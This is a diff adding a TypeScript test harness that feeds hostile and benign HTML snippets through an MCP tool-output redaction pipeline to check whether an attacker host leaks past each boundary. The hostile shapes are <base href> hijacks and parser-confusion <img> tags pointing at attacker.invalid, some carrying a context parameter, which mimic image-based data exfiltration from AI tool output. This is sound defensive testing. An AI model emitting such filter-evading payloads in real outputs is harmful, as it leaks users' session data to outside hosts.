@@ -1,0 +1,175 @@
+// T53 — MY classes at the REAL public boundaries.
+//
+// The T42 boundary probe covers the classes T42 found. This one drives the
+// classes THIS review derived (the <base> element, the tokenizer states T52's
+// table did not enumerate, and benign controls including a legitimate
+// documentation <base>) through:
+//   - dispatchCallTool            (MCP transport)
+//   - prepareOutputForPersistence (durable-sink materializer)
+//   - validateOutputForTransport  (the exact function redact-seam calls)
+//   - redactToolOutput            (MCP compatibility seam)
+//
+// Advisory redaction is OFF, so what is measured is the MANDATORY floor.
+// Read-only, synthetic hosts only.
+//
+// Usage: bun T53-boundary.ts <out.json>
+import {
+  prepareOutputForPersistence,
+  validateOutputForTransport,
+  type GuardResult,
+} from "../../../../src/security/guard";
+import { mergeMcpConfig } from "../../../../src/mcp/config";
+import { buildDiscovery } from "../../../../src/mcp/discovery";
+import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
+import { redactToolOutput } from "../../../../src/mcp/redact-seam";
+
+const ATT = "attacker.invalid";
+const CDN = "cdn.example.org";
+const BS = String.fromCharCode(92);
+
+const pass: GuardResult = {
+  allowed: true,
+  decision: { gate: "pass", action: "allow", findings: [] },
+};
+
+// name -> [payload, mustNotLeakHost]
+const shapes: Record<string, { text: string; hostile: boolean }> = {
+  // --- <base>: the new finding class -----------------------------------------
+  baseAbsolute: { text: `<base href="https://${ATT}/x/"><img src="pixel.png?ctx=CTX">`, hostile: true },
+  baseProtocolRelative: { text: `<base href="//${ATT}/x/"><img src="pixel.png">`, hostile: true },
+  baseSchemeNoSlashes: { text: `<base href="https:${ATT}/x/"><img src="pixel.png">`, hostile: true },
+  baseBackslash: { text: `<base href="${BS}${BS}${ATT}/x/"><img src="pixel.png">`, hostile: true },
+  baseEntityColon: { text: `<base href="https&colon;//${ATT}/x/"><img src="pixel.png">`, hostile: true },
+  baseGtHidesHref: { text: `<base target="a>b" href="https://${ATT}/x/">`, hostile: true },
+  baseUnquoted: { text: `<base href=https://${ATT}/x/>`, hostile: true },
+  baseAfterImage: { text: `<img src="pixel.png"><base href="https://${ATT}/x/">`, hostile: true },
+  baseUpperSingleQuote: { text: `<BASE HREF='https://${ATT}/x/'>`, hostile: true },
+
+  // --- tokenizer states T52's table did not enumerate -------------------------
+  quoteInAttributeName: { text: `<img "src=x" src="https://${ATT}/p?ctx=CTX">`, hostile: true },
+  aposInAttributeName: { text: `<img 'src=x' src="https://${ATT}/p?ctx=CTX">`, hostile: true },
+  unquotedValueQuoteData: { text: `<img src=https://${ATT}/p"x>`, hostile: true },
+  unquotedValueBacktick: { text: `<img src=https://${ATT}/p\`x>`, hostile: true },
+  unquotedValueLt: { text: `<img src=https://${ATT}/p<x>`, hostile: true },
+  unquotedEndAtFormFeed: { text: `<img src=https://${ATT}/p\falt=x>`, hostile: true },
+  solidusRun: { text: `<img ///src="https://${ATT}/p"///>`, hostile: true },
+  nulLeadingValue: { text: `<img src="\u0000https://${ATT}/p">`, hostile: true },
+  eofInTagQuoted: { text: `<img src="https://${ATT}/p"`, hostile: true },
+  gtThenRealTag: { text: `<img alt="a>b" src="/a.png"><img src="https://${ATT}/p">`, hostile: true },
+
+  // --- benign controls: nothing here is a network send ------------------------
+  ctlPublicLink: { text: "[public documentation](https://docs.example.org/guide)", hostile: false },
+  ctlRelativeImage: { text: `<img src="/assets/logo.png">`, hostile: false },
+  ctlRelativeBase: { text: `<base href="/docs/v2/"><img src="pixel.png">`, hostile: false },
+  ctlBaseNoHref: { text: `<base target="_blank">`, hostile: false },
+  ctlProseSrcGt: { text: "The tag uses src= and ends with > — nothing here is markup.", hostile: false },
+  ctlMarkupInValue: { text: `<img alt="<img src=https://${ATT}/p>" src="/a.png">`, hostile: false },
+  ctlCdnBaseDoc: { text: `<base href="https://${CDN}/docs/v2/"><img src="logo.png">`, hostile: false },
+};
+
+const cwd = process.cwd();
+
+const persistence = Object.fromEntries(
+  Object.entries(shapes).map(([name, shape]) => {
+    const serialized = JSON.stringify({ note: shape.text });
+    const result = prepareOutputForPersistence(pass, serialized);
+    return [
+      name,
+      result.allowed
+        ? {
+            allowed: true,
+            leaksHost: result.content.includes(ATT),
+            bytesIdenticalToInput: result.content === serialized,
+            state: result.redaction.state,
+            reasons: result.redaction.reasons,
+            bytesPreserved: result.bytesPreserved,
+          }
+        : { allowed: false, reason: result.reason },
+    ];
+  }),
+);
+
+const transport = Object.fromEntries(
+  Object.entries(shapes).map(([name, shape]) => {
+    const result = validateOutputForTransport({ value: { note: shape.text }, format: "json" });
+    return [
+      name,
+      {
+        ok: result.ok,
+        state: result.redaction.state,
+        reasons: result.redaction.reasons,
+        leaksHost: result.text.includes(ATT),
+      },
+    ];
+  }),
+);
+
+const seam = Object.fromEntries(
+  await Promise.all(
+    Object.entries(shapes).map(async ([name, shape]) => {
+      const serialized = JSON.stringify({ note: shape.text });
+      const text = await redactToolOutput(cwd, serialized);
+      return [name, { identicalToInput: text === serialized, leaksHost: text.includes(ATT) }];
+    }),
+  ),
+);
+
+const ctx: McpContext = {
+  cwd,
+  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF
+  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
+  transport: "in-process",
+  tools: Object.entries(shapes).map(([name, shape]) => ({
+    name: `p.${name}`,
+    module: "standard" as const,
+    description: name,
+    inputSchema: { type: "object" },
+    mutating: false,
+    invoke: async () => ({ note: shape.text }),
+  })),
+};
+
+const mcp: Record<string, unknown> = {};
+for (const name of Object.keys(shapes)) {
+  const result = await dispatchCallTool(ctx, `p.${name}`, {});
+  mcp[name] = {
+    isError: result.isError,
+    redaction: result.redaction,
+    leaksHost: JSON.stringify(result).includes(ATT),
+  };
+}
+
+const leaks: string[] = [];
+const benignFlagged: string[] = [];
+for (const [name, shape] of Object.entries(shapes)) {
+  const m = mcp[name] as { leaksHost: boolean; redaction: { state: string; reasons: string[] } };
+  const p = persistence[name] as { leaksHost?: boolean };
+  const t = transport[name] as { leaksHost: boolean };
+  const s = seam[name] as { leaksHost: boolean };
+  if (shape.hostile && (m.leaksHost || p.leaksHost || t.leaksHost || s.leaksHost)) leaks.push(name);
+  if (!shape.hostile && m.redaction.state !== "none") benignFlagged.push(name);
+}
+
+const summary = {
+  shapes: Object.keys(shapes).length,
+  hostile: Object.values(shapes).filter((shape) => shape.hostile).length,
+  benign: Object.values(shapes).filter((shape) => !shape.hostile).length,
+  hostileLeakingAtAnyBoundary: leaks.length,
+  hostileLeakingIds: leaks,
+  benignNotByteIdenticalAtMcp: benignFlagged.length,
+  benignNotByteIdenticalIds: benignFlagged,
+};
+
+for (const name of Object.keys(shapes)) {
+  const m = mcp[name] as { isError: boolean; redaction: { state: string; reasons: string[] }; leaksHost: boolean };
+  const p = persistence[name] as { leaksHost?: boolean; bytesIdenticalToInput?: boolean };
+  const t = transport[name] as { leaksHost: boolean };
+  const s = seam[name] as { leaksHost: boolean };
+  console.log(
+    `${name.padEnd(24)} mcp isError=${m.isError} state=${m.redaction?.state} reasons=${JSON.stringify(m.redaction?.reasons)} leaksHost=${m.leaksHost} | persist leaksHost=${p.leaksHost} identical=${p.bytesIdenticalToInput} | transport leaksHost=${t.leaksHost} | seam leaksHost=${s.leaksHost}`,
+  );
+}
+console.log(JSON.stringify(summary, null, 2));
+
+const out = process.argv[2];
+if (out) await Bun.write(out, JSON.stringify({ summary, mcp, persistence, transport, seam }, null, 2));
